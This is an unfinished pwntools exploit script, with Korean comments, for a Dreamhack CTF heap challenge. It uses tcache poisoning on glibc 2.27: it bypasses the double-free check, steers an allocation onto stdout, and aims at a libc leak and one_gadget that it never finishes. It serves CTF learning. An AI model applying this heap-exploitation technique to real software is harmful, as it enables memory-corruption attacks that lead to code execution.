from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

# Local
LOCAL = False
if LOCAL:
	p = process("./tcache_poison")
else:
	PORT = int(input("Port: "))
	HOST = int(input("Host: "))
	p = remote("host"+str(HOST)+".dreamhack.games", PORT)

def alloc(size, data):
	p.sendlineafter("Edit\n", "1")
	p.sendlineafter(":", str(size))
	p.sendafter(":", data)

def free():
	p.sendlineafter("Edit\n", "2")

def print_chunk():
	p.sendlineafter("Edit\n", "3")

def edit(data):
	p.sendlineafter("Edit\n", "4")
	p.sendafter(":", data)

elf = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")

# [1] malloc 1회 생성	
alloc(0x30, "dreamhack")
free()
# malloc 할당된 청크의 주소 = X라고 할 때
# 현재 tcache: X

# [2] fd: AAAAAAAA, key 부분에 \x00 추가함으로써 DFB 우회
# 이후 tcache에 동일한 chunk 들어감
edit("A" * 0x8 + "\x00")
free()
# 동일한 청크가 2번이나 tcache에 중복으로 들어가지만 (tcache duplication)
# 차례를 구분하기 위해 처음을 X, 나중을 X'으로 구분한다.
# 현재 tcache: X -> X(X'), X = X'

# [3] stdout 
addr_stdout = elf.symbols["stdout"]
alloc(0x30, p64(addr_stdout))
# X'의 data 영역에 addr_stdout이 쓰이게 되고
# 이는 곧 X의 fd가 되고, tcache에는 다음에 할당되어야 할 chunk의 주소로써 들어가게 된다.
# 현재 tcache: X -> (stdout -> __IO_2_1_stdout_)

# [4] fd에 stdout을 넣어 그 다음인 _IO_2_1_stdout_으로 연결
# libc-2.27.so에서 stdout의 하위 3바이트는 760
alloc(0x30, "B" * 0x8)
alloc(0x30, "\x60")
# stdout: 0x601010에 위치


# [5] libc_base & one_gadget
print_chunk()
"""
p.recvuntil("Content: ")
stdout = 
"""
p.interactive()
